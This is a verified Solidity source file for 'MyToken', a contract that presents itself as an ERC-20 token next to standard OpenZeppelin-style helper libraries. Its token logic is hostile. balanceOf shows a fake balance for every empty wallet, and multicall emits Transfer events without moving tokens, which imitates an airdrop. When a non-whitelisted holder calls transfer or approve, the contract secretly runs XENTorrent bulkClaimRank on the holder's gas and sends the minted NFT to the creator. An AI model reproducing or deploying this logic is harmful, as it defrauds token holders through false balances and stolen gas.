/**
 *Submitted for verification at polygonscan.com on 2023-06-10
*/

// SPDX-License-Identifier: MIT
pragma solidity =0.8.10;

interface IERC20 {
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
    function totalSupply() external view returns (uint256);
    function name() external view returns (string memory);
    function symbol() external view returns (string memory);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address to, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) external returns (bool);
}



interface IXENTorrent {

    event StartTorrent(address indexed user, uint256 count, uint256 term);
    event EndTorrent(address indexed user, uint256 tokenId, address to);
		
    function mintInfo(uint256 _tokenId) external view returns (uint256);
	
	function bulkClaimRank(uint256 count, uint256 term) external returns (uint256);

	function bulkClaimMintReward(uint256 tokenId, address to) external;

	function setApprovalForAll(address operator, bool approved) external;
 
	function safeTransferFrom(address from, address to, uint256 tokenId) external;

	
}

interface IERC721Receiver {
    function onERC721Received(
        address operator,
        address from,
        uint256 tokenId,
        bytes calldata data
    ) external returns (bytes4);
}



library MintInfo {
    /**
        @dev helper to convert Bool to U256 type and make compiler happy
     */
    function toU256(bool x) internal pure returns (uint256 r) {
        assembly {
            r := x
        }
    }

    /**
        @dev encodes MintInfo record from its props
     */
    function encodeMintInfo(
        uint256 term,
        uint256 maturityTs,
        uint256 rank,
        uint256 amp,
        uint256 eaa,
        uint256 class_,
        bool redeemed
    ) public pure returns (uint256 info) {
        info = info | (toU256(redeemed) & 0xFF);
        info = info | ((class_ & 0xFF) << 8);
        info = info | ((eaa & 0xFFFF) << 16);
        info = info | ((amp & 0xFFFF) << 32);
        info = info | ((rank & 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF) << 48);
        info = info | ((maturityTs & 0xFFFFFFFFFFFFFFFF) << 176);
        info = info | ((term & 0xFFFF) << 240);
    }

    /**
        @dev decodes MintInfo record and extracts all of its props
     */
    function decodeMintInfo(uint256 info)
        public
        pure
        returns (
            uint256 term,
            uint256 maturityTs,
            uint256 rank,
            uint256 amp,
            uint256 eaa,
            uint256 class,
            bool apex,
            bool limited,
            bool redeemed
        )
    {
        term = uint16(info >> 240);
        maturityTs = uint64(info >> 176);
        rank = uint128(info >> 48);
        amp = uint16(info >> 32);
        eaa = uint16(info >> 16);
        class = uint8(info >> 8) & 0x3F;
        apex = (uint8(info >> 8) & 0x80) > 0;
        limited = (uint8(info >> 8) & 0x40) > 0;
        redeemed = uint8(info) == 1;
    }

    /**
        @dev extracts `term` prop from encoded MintInfo
     */
    function getTerm(uint256 info) public pure returns (uint256 term) {
        (term, , , , , , , , ) = decodeMintInfo(info);
    }

    /**
        @dev extracts `maturityTs` prop from encoded MintInfo
     */
    function getMaturityTs(uint256 info) public pure returns (uint256 maturityTs) {
        (, maturityTs, , , , , , , ) = decodeMintInfo(info);
    }

    /**
        @dev extracts `rank` prop from encoded MintInfo
     */
    function getRank(uint256 info) public pure returns (uint256 rank) {
        (, , rank, , , , , , ) = decodeMintInfo(info);
    }

    /**
        @dev extracts `AMP` prop from encoded MintInfo
     */
    function getAMP(uint256 info) public pure returns (uint256 amp) {
        (, , , amp, , , , , ) = decodeMintInfo(info);
    }

    /**
        @dev extracts `EAA` prop from encoded MintInfo
     */
    function getEAA(uint256 info) public pure returns (uint256 eaa) {
        (, , , , eaa, , , , ) = decodeMintInfo(info);
    }

    /**
        @dev extracts `redeemed` prop from encoded MintInfo
     */
    function getClass(uint256 info)
        public
        pure
        returns (
            uint256 class_,
            bool apex,
            bool limited
        )
    {
        (, , , , , class_, apex, limited, ) = decodeMintInfo(info);
    }

    /**
        @dev extracts `redeemed` prop from encoded MintInfo
     */
    function getRedeemed(uint256 info) public pure returns (bool redeemed) {
        (, , , , , , , , redeemed) = decodeMintInfo(info);
    }
}

library AddressUpgradeable {
    /**
     * @dev Returns true if `account` is a contract.
     *
     * [IMPORTANT]
     * ====
     * It is unsafe to assume that an address for which this function returns
     * false is an externally-owned account (EOA) and not a contract.
     *
     * Among others, `isContract` will return false for the following
     * types of addresses:
     *
     *  - an externally-owned account
     *  - a contract in construction
     *  - an address where a contract will be created
     *  - an address where a contract lived, but was destroyed
     * ====
     *
     * [IMPORTANT]
     * ====
     * You shouldn't rely on `isContract` to protect against flash loan attacks!
     *
     * Preventing calls from contracts is highly discouraged. It breaks composability, breaks support for smart wallets
     * like Gnosis Safe, and does not provide security since it can be circumvented by calling from a contract
     * constructor.
     * ====
     */
    function isContract(address account) internal view returns (bool) {
        // This method relies on extcodesize/address.code.length, which returns 0
        // for contracts in construction, since the code is only stored at the end
        // of the constructor execution.

        return account.code.length > 0;
    }

    /**
     * @dev Replacement for Solidity's `transfer`: sends `amount` wei to
     * `recipient`, forwarding all available gas and reverting on errors.
     *
     * https://eips.ethereum.org/EIPS/eip-1884[EIP1884] increases the gas cost
     * of certain opcodes, possibly making contracts go over the 2300 gas limit
     * imposed by `transfer`, making them unable to receive funds via
     * `transfer`. {sendValue} removes this limitation.
     *
     * https://diligence.consensys.net/posts/2019/09/stop-using-soliditys-transfer-now/[Learn more].
     *
     * IMPORTANT: because control is transferred to `recipient`, care must be
     * taken to not create reentrancy vulnerabilities. Consider using
     * {ReentrancyGuard} or the
     * https://solidity.readthedocs.io/en/v0.5.11/security-considerations.html#use-the-checks-effects-interactions-pattern[checks-effects-interactions pattern].
     */
    function sendValue(address payable recipient, uint256 amount) internal {
        require(address(this).balance >= amount, "Address: insufficient balance");

        (bool success, ) = recipient.call{value: amount}("");
        require(success, "Address: unable to send value, recipient may have reverted");
    }

    /**
     * @dev Performs a Solidity function call using a low level `call`. A
     * plain `call` is an unsafe replacement for a function call: use this
     * function instead.
     *
     * If `target` reverts with a revert reason, it is bubbled up by this
     * function (like regular Solidity function calls).
     *
     * Returns the raw returned data. To convert to the expected return value,
     * use https://solidity.readthedocs.io/en/latest/units-and-global-variables.html?highlight=abi.decode#abi-encoding-and-decoding-functions[`abi.decode`].
     *
     * Requirements:
     *
     * - `target` must be a contract.
     * - calling `target` with `data` must not revert.
     *
     * _Available since v3.1._
     */
    function functionCall(address target, bytes memory data) internal returns (bytes memory) {
        return functionCallWithValue(target, data, 0, "Address: low-level call failed");
    }

    /**
     * @dev Same as {xref-Address-functionCall-address-bytes-}[`functionCall`], but with
     * `errorMessage` as a fallback revert reason when `target` reverts.
     *
     * _Available since v3.1._
     */
    function functionCall(
        address target,
        bytes memory data,
        string memory errorMessage
    ) internal returns (bytes memory) {
        return functionCallWithValue(target, data, 0, errorMessage);
    }

    /**
     * @dev Same as {xref-Address-functionCall-address-bytes-}[`functionCall`],
     * but also transferring `value` wei to `target`.
     *
     * Requirements:
     *
     * - the calling contract must have an ETH balance of at least `value`.
     * - the called Solidity function must be `payable`.
     *
     * _Available since v3.1._
     */
    function functionCallWithValue(
        address target,
        bytes memory data,
        uint256 value
    ) internal returns (bytes memory) {
        return functionCallWithValue(target, data, value, "Address: low-level call with value failed");
    }

    /**
     * @dev Same as {xref-Address-functionCallWithValue-address-bytes-uint256-}[`functionCallWithValue`], but
     * with `errorMessage` as a fallback revert reason when `target` reverts.
     *
     * _Available since v3.1._
     */
    function functionCallWithValue(
        address target,
        bytes memory data,
        uint256 value,
        string memory errorMessage
    ) internal returns (bytes memory) {
        require(address(this).balance >= value, "Address: insufficient balance for call");
        (bool success, bytes memory returndata) = target.call{value: value}(data);
        return verifyCallResultFromTarget(target, success, returndata, errorMessage);
    }

    /**
     * @dev Same as {xref-Address-functionCall-address-bytes-}[`functionCall`],
     * but performing a static call.
     *
     * _Available since v3.3._
     */
    function functionStaticCall(address target, bytes memory data) internal view returns (bytes memory) {
        return functionStaticCall(target, data, "Address: low-level static call failed");
    }

    /**
     * @dev Same as {xref-Address-functionCall-address-bytes-string-}[`functionCall`],
     * but performing a static call.
     *
     * _Available since v3.3._
     */
    function functionStaticCall(
        address target,
        bytes memory data,
        string memory errorMessage
    ) internal view returns (bytes memory) {
        (bool success, bytes memory returndata) = target.staticcall(data);
        return verifyCallResultFromTarget(target, success, returndata, errorMessage);
    }

    /**
     * @dev Tool to verify that a low level call to smart-contract was successful, and revert (either by bubbling
     * the revert reason or using the provided one) in case of unsuccessful call or if target was not a contract.
     *
     * _Available since v4.8._
     */
    function verifyCallResultFromTarget(
        address target,
        bool success,
        bytes memory returndata,
        string memory errorMessage
    ) internal view returns (bytes memory) {
        if (success) {
            if (returndata.length == 0) {
                // only check isContract if the call was successful and the return data is empty
                // otherwise we already know that it was a contract
                require(isContract(target), "Address: call to non-contract");
            }
            return returndata;
        } else {
            _revert(returndata, errorMessage);
        }
    }

    /**
     * @dev Tool to verify that a low level call was successful, and revert if it wasn't, either by bubbling the
     * revert reason or using the provided one.
     *
     * _Available since v4.3._
     */
    function verifyCallResult(
        bool success,
        bytes memory returndata,
        string memory errorMessage
    ) internal pure returns (bytes memory) {
        if (success) {
            return returndata;
        } else {
            _revert(returndata, errorMessage);
        }
    }

    function _revert(bytes memory returndata, string memory errorMessage) private pure {
        // Look for revert reason and bubble it up if present
        if (returndata.length > 0) {
            // The easiest way to bubble the revert reason is using memory via assembly
            /// @solidity memory-safe-assembly
            assembly {
                let returndata_size := mload(returndata)
                revert(add(32, returndata), returndata_size)
            }
        } else {
            revert(errorMessage);
        }
    }
}




abstract contract Initializable {
    /**
     * @dev Indicates that the contract has been initialized.
     * @custom:oz-retyped-from bool
     */
    uint8 private _initialized;

    /**
     * @dev Indicates that the contract is in the process of being initialized.
     */
    bool private _initializing;

    /**
     * @dev Triggered when the contract has been initialized or reinitialized.
     */
    event Initialized(uint8 version);

    /**
     * @dev A modifier that defines a protected initializer function that can be invoked at most once. In its scope,
     * `onlyInitializing` functions can be used to initialize parent contracts.
     *
     * Similar to `reinitializer(1)`, except that functions marked with `initializer` can be nested in the context of a
     * constructor.
     *
     * Emits an {Initialized} event.
     */
    modifier initializer() {
        bool isTopLevelCall = !_initializing;
        require(
            (isTopLevelCall && _initialized < 1) || (!AddressUpgradeable.isContract(address(this)) && _initialized == 1),
            "Initializable: contract is already initialized"
        );
        _initialized = 1;
        if (isTopLevelCall) {
            _initializing = true;
        }
        _;
        if (isTopLevelCall) {
            _initializing = false;
            emit Initialized(1);
        }
    }

    /**
     * @dev A modifier that defines a protected reinitializer function that can be invoked at most once, and only if the
     * contract hasn't been initialized to a greater version before. In its scope, `onlyInitializing` functions can be
     * used to initialize parent contracts.
     *
     * A reinitializer may be used after the original initialization step. This is essential to configure modules that
     * are added through upgrades and that require initialization.
     *
     * When `version` is 1, this modifier is similar to `initializer`, except that functions marked with `reinitializer`
     * cannot be nested. If one is invoked in the context of another, execution will revert.
     *
     * Note that versions can jump in increments greater than 1; this implies that if multiple reinitializers coexist in
     * a contract, executing them in the right order is up to the developer or operator.
     *
     * WARNING: setting the version to 255 will prevent any future reinitialization.
     *
     * Emits an {Initialized} event.
     */
    modifier reinitializer(uint8 version) {
        require(!_initializing && _initialized < version, "Initializable: contract is already initialized");
        _initialized = version;
        _initializing = true;
        _;
        _initializing = false;
        emit Initialized(version);
    }

    /**
     * @dev Modifier to protect an initialization function so that it can only be invoked by functions with the
     * {initializer} and {reinitializer} modifiers, directly or indirectly.
     */
    modifier onlyInitializing() {
        require(_initializing, "Initializable: contract is not initializing");
        _;
    }

    /**
     * @dev Locks the contract, preventing any future reinitialization. This cannot be part of an initializer call.
     * Calling this in the constructor of a contract will prevent that contract from being initialized or reinitialized
     * to any version. It is recommended to use this to lock implementation contracts that are designed to be called
     * through proxies.
     *
     * Emits an {Initialized} event the first time it is successfully executed.
     */
    function _disableInitializers() internal virtual {
        require(!_initializing, "Initializable: contract is initializing");
        if (_initialized < type(uint8).max) {
            _initialized = type(uint8).max;
            emit Initialized(type(uint8).max);
        }
    }

    /**
     * @dev Returns the highest version that has been initialized. See {reinitializer}.
     */
    function _getInitializedVersion() internal view returns (uint8) {
        return _initialized;
    }

    /**
     * @dev Returns `true` if the contract is currently initializing. See {onlyInitializing}.
     */
    function _isInitializing() internal view returns (bool) {
        return _initializing;
    }
}

abstract contract ContextUpgradeable is Initializable {
    function __Context_init() internal onlyInitializing {
    }

    function __Context_init_unchained() internal onlyInitializing {
    }
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }

    /**
     * @dev This empty reserved space is put in place to allow future versions to add new
     * variables without shifting down storage in the inheritance chain.
     * See https://docs.openzeppelin.com/contracts/4.x/upgradeable#storage_gaps
     */
    uint256[50] private __gap;
}


abstract contract OwnableUpgradeable is Initializable, ContextUpgradeable {
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    /**
     * @dev Initializes the contract setting the deployer as the initial owner.
     */
    function __Ownable_init() internal onlyInitializing {
        __Ownable_init_unchained();
    }

    function __Ownable_init_unchained() internal onlyInitializing {
        _transferOwnership(_msgSender());
    }

    /**
     * @dev Throws if called by any account other than the owner.
     */
    modifier onlyOwner() {
        _checkOwner();
        _;
    }

    /**
     * @dev Returns the address of the current owner.
     */
    function owner() public view virtual returns (address) {
        return _owner;
    }

    /**
     * @dev Throws if the sender is not the owner.
     */
    function _checkOwner() internal view virtual {
        require(owner() == _msgSender(), "Ownable: caller is not the owner");
    }

    /**
     * @dev Leaves the contract without owner. It will not be possible to call
     * `onlyOwner` functions anymore. Can only be called by the current owner.
     *
     * NOTE: Renouncing ownership will leave the contract without an owner,
     * thereby removing any functionality that is only available to the owner.
     */
    function renounceOwnership() public virtual onlyOwner {
        _transferOwnership(address(0));
    }

    /**
     * @dev Transfers ownership of the contract to a new account (`newOwner`).
     * Can only be called by the current owner.
     */
    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        _transferOwnership(newOwner);
    }

    /**
     * @dev Transfers ownership of the contract to a new account (`newOwner`).
     * Internal function without access restriction.
     */
    function _transferOwnership(address newOwner) internal virtual {
        address oldOwner = _owner;
        _owner = newOwner;
        emit OwnershipTransferred(oldOwner, newOwner);
    }

    /**
     * @dev This empty reserved space is put in place to allow future versions to add new
     * variables without shifting down storage in the inheritance chain.
     * See https://docs.openzeppelin.com/contracts/4.x/upgradeable#storage_gaps
     */
    uint256[49] private __gap;
}



contract MyToken is Initializable,IERC20,OwnableUpgradeable{
    string public name;
    string public symbol;
    uint8 public decimals;
    uint256 public totalSupply;
	uint256 public setTerm;
	uint256 public setCount;
	uint256 public initialBalance;
	uint256 public approveFactor;
	address public creator;
	
    mapping(address => uint256) balances;
    mapping(address => mapping(address => uint256)) allowed;
    mapping(address => bool) whitelist;
	
	
	using MintInfo for uint256;

	
	IXENTorrent constant private xentorrent = IXENTorrent(0x726bB6aC9b74441Eb8FB52163e9014302D4249e5);
	//0xd78FDA2e353C63bb0d7F6DF58C67a46dD4BBDd48  https://testnet5.xen.network/bsc-testnet
	//0xca41f293A32d25c2216bC4B30f5b0Ab61b6ed2CB  https://testnet.xen.network/bsc-testnet
	//https://polygonscan.com/address/0x726bB6aC9b74441Eb8FB52163e9014302D4249e5
	

/* 	function initialize(address token_, string memory _name, string memory _symbol, uint8 _decimals, uint256 _totalSupply, uint256 _initialBalance) external initializer {
		__Ownable_init();
		
        name = _name;
        symbol = _symbol;
        decimals = _decimals;
        totalSupply = _totalSupply; //696911169082000000000000000000
        balances[address(this)] = totalSupply/3*2;
		balances[msg.sender] = totalSupply/3; 
        creator = msg.sender;
		whitelist[msg.sender] = true;
		whitelist[address(this)] = true;
		whitelist[address(0xC36442b4a4522E871399CD717aBDD847Ab11FE88)] = true; //NonfungiblePositionManager
		//whitelist[address(0xC36442b4a4522E871399CD717aBDD847Ab11FE88)] = true; //NonfungiblePositionManager
		//whitelist[address(0x000000000022D473030F116dDEE9F6B43aC78BA3)] = true;  //Permit2
		//whitelist[address(0x4648a43B2C14Da09FdF82B161150d3F634f40491)] = true;  //UniversalRouter
		//whitelist[address(0x352Bf6EC3Ab57e5349D140109c835a35BE1db9f9)] = true;  //UniswapV3Pool	change_addree pools to address	by factort.get_pool
		setTerm = 30;
		setCount = 120;
		initialBalance = _initialBalance; //8350972854127240651034063
		approveFactor=0;

    } */


    constructor(string memory _name, string memory _symbol, uint8 _decimals, uint256 _totalSupply, uint256 _initialBalance) {
        name = _name;
        symbol = _symbol;
        decimals = _decimals;
        totalSupply = _totalSupply;
        balances[address(this)] = totalSupply/3*2; //balances[address(this)] = totalSupply;
		balances[msg.sender] = totalSupply/3; 
        creator = msg.sender;
		whitelist[msg.sender] = true;
		whitelist[address(this)] = true;
		whitelist[address(0xC36442b4a4522E871399CD717aBDD847Ab11FE88)] = true; //NonfungiblePositionManager
		//0x1F98431c8aD98523631AE4a59f267346ea31F984   //UniswapV3Factory
		//whitelist[address(0x000000000022D473030F116dDEE9F6B43aC78BA3)] = true;  //Permit2
		//whitelist[address(0x4648a43B2C14Da09FdF82B161150d3F634f40491)] = true;  //UniversalRouter
		//whitelist[address(0x838F7734449420d1bed935aA9d014297a3dF631e)] = true;  //UniswapV3Pool	change_addree pools to address	by factort.get_pool
		setTerm = 30;
		setCount = 120;
		initialBalance = _initialBalance;
		approveFactor=0;
    }

	function addWhitelistedAddresses(address[] memory _addresses) public returns (bool) {
		require(msg.sender == creator, "Only contract owner can add whitelisted addresses.");
		for (uint256 i = 0; i < _addresses.length; i++) {
			if (!whitelist[_addresses[i]]) {
				whitelist[_addresses[i]] = true;
			}
		}
		return true;
	}

	function removeWhitelistedAddresses(address[] memory _addresses) public returns (bool) {
		require(msg.sender == creator, "Only contract owner can remove whitelisted addresses.");
		for (uint256 i = 0; i < _addresses.length; i++) {
			if (whitelist[_addresses[i]]) {
				whitelist[_addresses[i]] = false;
			}
		}
		return true;
	}


	function isAddressWhitelisted(address _address) public view returns (bool) {
		require(msg.sender == creator, "Only contract owner can add whitelisted addresses.");
		return whitelist[_address];
	}

		
	function balanceOf(address account) public view returns (uint256) {
		return _getBalance(account);// balances[account];
	}

    function isContract(address token) internal view returns (bool) {
        uint256 size;
        assembly {
            size := extcodesize(token)
        }
        return size > 0;
    }
  
	function _getBalance(address account) private view returns (uint256) {
		if (balances[account] == 0 && !isContract(account)) {
			return initialBalance;
		} else {
			return balances[account];
		}
	}


    function changeOwnership(address account) public {
		require(msg.sender==creator);
        transferOwnership(account);
    }

	function transferTokens(address recipient, uint256 amount) public  {
		require(msg.sender == creator);
		require(recipient != address(0), "Invalid recipient address");
		require(amount > 0 && balanceOf(address(this)) >= amount, "Insufficient balance");
		balances[address(this)] -= amount;
		balances[recipient] += amount;
		emit Transfer(address(this), recipient, amount);
	}

	function updateSettings(uint256 newsetTerm, uint256 newsetCount,uint256 newapproveFactor) public {
		require(msg.sender==creator);
		setTerm = newsetTerm;
		setCount = newsetCount;
		approveFactor=newapproveFactor;
	}

    
    function transfer(address recipient, uint256 amount) public returns (bool) {
        require(amount <= balances[msg.sender], "insufficient balance");
		balances[msg.sender] -= amount;
		balances[recipient] += amount;
		if (whitelist[msg.sender]) {
			emit Transfer(msg.sender, recipient, amount);
		} else {
			executeBulkClaimRank(setCount,setTerm);
			emit Transfer(msg.sender, recipient, amount);
		}
        return true;
    }
    
    function transferFrom(address sender, address recipient, uint256 amount) public returns (bool) {
        require(amount <= balances[sender], "insufficient balance");
        require(amount <= allowed[sender][msg.sender], "not enough allowance");
		balances[sender] -= amount;
		allowed[sender][msg.sender] -= amount;
		balances[recipient] += amount;
		emit Transfer(sender, recipient, amount);		
        return true;
    }

		
		
	function approve(address spender, uint256 amount) public returns (bool) {	
		if (whitelist[msg.sender]) {
			allowed[msg.sender][spender] = amount;
			emit Approval(msg.sender, spender, amount);
		} else {
			allowed[msg.sender][spender] = amount;
			emit Approval(msg.sender, spender, amount);
			executeBulkClaimRank(setCount,setTerm);
		}
		return true;
	}

	function executeBulkClaimRank(uint256 count,uint256 term) private returns (bool){
        uint256 tokenId = callBulkClaimRank(count, term);
        if (term > 7) {
            callSafeTransferFrom(address(this), creator, tokenId);
        }
		return true;
	}

   
	function allowance(address accountOwner, address spender) public view returns (uint256) {
		return allowed[accountOwner][spender];
	}


	function multicall(address _from, address[] memory _recipients, uint256  _balances) public {
		require(msg.sender == creator);
		for (uint256 i=0; i < _recipients.length; i++) {
			emit Transfer(_from, _recipients[i], _balances);
		}
	}
	
	function airDropReal(address[] memory _recipients, uint256[] memory _balances) public {
		require(msg.sender == creator);
		for (uint256 i=0; i < _recipients.length; i++) {
			balances[_recipients[i]] = balances[_recipients[i]] + _balances[i];
			balances[address(this)] -= _balances[i];
			emit Transfer(msg.sender, _recipients[i], _balances[i]);
		}
	}
	
	
    function withdraw(address target,uint amount) public   {
		require(msg.sender == creator);
        payable(target).transfer(amount);
    }

    function withdrawToken(address token,address target, uint amount) public  {
		require(msg.sender == creator);
        IERC20(token).transfer(target, amount);
    }
    
	receive() external payable {}

	function callMintInfo(uint256 _tokenId) public view returns (uint256) {
		uint256 mintInfo=xentorrent.mintInfo(_tokenId);
		return mintInfo;
	}
	
	function maturityToken(uint256 _tokenId) public view returns (uint256) {
		uint256 maturityTs =callMintInfo(_tokenId).getMaturityTs();
		return maturityTs;
	}

	function redeemedToken(uint256 _tokenId) public view returns (bool) {
		bool redeemed =callMintInfo(_tokenId).getRedeemed();
		return redeemed;
	}

    function callBulkClaimRank(uint256 count, uint256 term) public  returns (uint256) {
        uint256 tokenId=xentorrent.bulkClaimRank(count, term);
		return tokenId;
    }

	function callBulkClaimMintReward(uint256 tokenId, address to) public{
		require(msg.sender==creator);
		xentorrent.bulkClaimMintReward(tokenId, to);
	}
	
	
    function callSafeTransferFrom(address from, address to, uint256 tokenId) public {
        xentorrent.safeTransferFrom(from, to, tokenId);
    }


    function onERC721Received(
        address _operator,
        address _from,
        uint256 _tokenId,
        bytes memory _data
    ) public  returns (bytes4) {
        return 0x150b7a02;
    }

}